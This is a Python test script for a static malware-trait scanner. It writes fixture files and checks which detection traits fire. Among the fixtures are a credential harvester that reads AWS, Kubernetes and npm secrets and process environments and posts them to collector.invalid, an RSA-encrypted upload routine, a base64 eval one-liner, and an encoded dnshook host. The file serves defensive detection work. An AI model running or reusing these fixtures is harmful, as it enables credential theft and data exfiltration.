#!/usr/bin/env python3
"""Scan static fixtures in scratch. Never import or execute fixture source."""
import argparse
import base64
import json
from pathlib import Path
import subprocess
import tempfile
import zipfile

parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--scratch-root', required=True)
args = parser.parse_args()
root = Path(__file__).resolve().parents[2]
proc = 'micro-behaviors/fs/read/file/full::python-globbed-proc-environ-read'
rsa = 'micro-behaviors/communications/http/upload::python-rsa-oaep-ciphertext-post'
iife = 'micro-behaviors/process/interpreter/eval/constructed::base64-buffer-function-iife'
collector = 'objectives/credential-access/env/harvesting::python-proc-environ-credential-collector'
host = 'micro-behaviors/communications/url/host/name::litellm-dev-host-reference'
oob = 'micro-behaviors/communications/url/host/oob::base64-dnshook-host-reference'
member = 'metadata/file/archive::wheel-cook-pth-member'
top_post = 'micro-behaviors/communications/http/post::python-module-post-url-body'
proc_source = '''from pathlib import Path
import json, requests
report = {'files': {}}
for target in ['.aws/credentials', '.aws/config', '.kube/config', '.npmrc']:
    path = Path.home() / target
    report['files'][target] = path.read_text()
for environ in Path('/proc').glob('[0-9]*/environ'):
    try:
        report['files'][str(environ)] = environ.read_bytes().decode(errors='replace')
    except OSError:
        pass
requests.post('https://collector.invalid/upload', data=json.dumps(report))
'''
rsa_source = '''from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
import requests

def send(payload, public_key):
    key = serialization.load_pem_public_key(public_key)
    encrypted = b''.join(key.encrypt(payload[i:i+200], padding.OAEP()) for i in range(0, len(payload), 200))
    requests.post('https://collector.invalid/upload', data=encrypted)
'''
js_source = "Function(Buffer.from('cmV0dXJuIDE7', 'base64').toString('utf8'))();\n"
cases = [
    ('proc.py', proc_source, {proc, collector}, set()),
    ('proc-wrong-root.py', proc_source.replace("Path('/proc')", "Path('/data')"), set(), {proc, collector}),
    ('proc-wrong-reader.py', proc_source.replace('environ.read_bytes()', 'unrelated.read_bytes()'), set(), {proc, collector}),
    ('proc-rebound-reader.py', proc_source.replace('    try:', "    environ = Path('/public')\n    try:"), set(), {proc, collector}),
    ('proc-query-only.py', proc_source.replace('environ.read_bytes().decode(errors=\'replace\')', 'str(environ)'), set(), {proc, collector}),
    ('proc-local-only.py', proc_source[:proc_source.index('requests.post')], {proc}, {collector}),
    ('rsa.py', rsa_source, {rsa}, set()),
    ('rsa-wrong-key.py', rsa_source.replace('key.encrypt', 'other.encrypt'), set(), {rsa}),
    ('rsa-shadowed-key.py', rsa_source.replace('for i in range', 'for key in range'), set(), {rsa}),
    ('rsa-wrong-body.py', rsa_source.replace('data=encrypted', 'data=payload'), set(), {rsa}),
    ('rsa-overwrite.py', rsa_source.replace('    requests.post', "    encrypted = b'public'\n    requests.post"), set(), {rsa}),
    ('rsa-headers-only.py', rsa_source.replace('data=encrypted', 'headers=encrypted'), set(), {rsa}),
    ('invoke.js', js_source, {iife}, set()),
    ('construct.js', js_source.replace('))();', '));'), set(), {iife}),
    ('wrong-encoding.js', js_source.replace("'base64'", "'hex'"), set(), {iife}),
    ('decoded-parameter.js', js_source.replace(".toString('utf8'))", ".toString('utf8'), 'return 1')"), set(), {iife}),
    ('unrelated.js', "Buffer.from('cmV0dXJuIDE7', 'base64'); Function('return 1')();", set(), {iife}),
    ('host.py', 'url = "http://www.litellm.dev/healthcheck"\n', {host}, set()),
    ('other-host.py', 'url = "http://other.invalid/healthcheck"\n', set(), {host}),
    ('oob.js', 'const hostname = "' + base64.b64encode(b'abcdefgh12345678.dnshook.site').decode() + '";\n', {oob}, set()),
    ('other-oob.js', 'const hostname = "' + base64.b64encode(b'abcdefgh12345678.other.invalid').decode() + '";\n', set(), {oob}),
    ('top-post.py', "import requests\nrequests.post('https://collector.invalid/upload', data='report')\n", {top_post}, set()),
    ('helper-post.py', "import requests\ndef helper():\n    requests.post('https://collector.invalid/upload', data='report')\n", set(), {top_post}),
    ('quoted-post.py', "source = '''requests.post('https://collector.invalid/upload', data='report')'''\n", set(), {top_post}),
    ('import-beacon.py', (root / 'testdata/hostile/supply-chain-controls/import-time-oob-beacon.py').read_text(), {top_post, 'objectives/supply-chain/recon-exfil/import-time::import-time-host-profile-beacon'}, set()),
]
with tempfile.TemporaryDirectory(prefix='registry-review-', dir=args.scratch_root) as temp:
    temp = Path(temp)
    expected = {}
    for name, source, required, forbidden in cases:
        p = temp / name
        p.write_text(source)
        expected[str(p)] = (required, forbidden)
    for name, member_name, required, forbidden in [
        ('hook.whl', 'cook.pth', {member}, set()),
        ('other.whl', 'other.pth', set(), {member}),
    ]:
        p = temp / name
        with zipfile.ZipFile(p, 'w') as z:
            z.writestr(member_name, '# static path fixture\n')
        expected[str(p)] = (required, forbidden)
    result = subprocess.run(['cleave', '--traits-dir', str(root), '--json', *expected], text=True, capture_output=True)
    assert result.returncode == 0, result.stderr
    decoder = json.JSONDecoder()
    remaining = result.stdout
    reports = []
    while remaining.strip():
        value, end = decoder.raw_decode(remaining.lstrip())
        reports.append(value)
        remaining = remaining.lstrip()[end:]
    files = {f['path']: f for d in reports for f in d.get('files', [])}
    for path, (required, forbidden) in expected.items():
        f = files[path]
        ids = {t['id'] for t in f.get('traits', [])}
        assert required <= ids, (path, 'missing', required - ids)
        assert not forbidden & ids, (path, 'unexpected', forbidden & ids)
        if Path(path).name in {'host.py', 'other-host.py', 'hook.whl', 'other.whl'}:
            assert not [t for t in f.get('traits', []) if t.get('crit', 0) >= 4], (path, 'neutral reference convicted')
        print('PASS', Path(path).name)
print(f'{len(expected)} static controls passed')
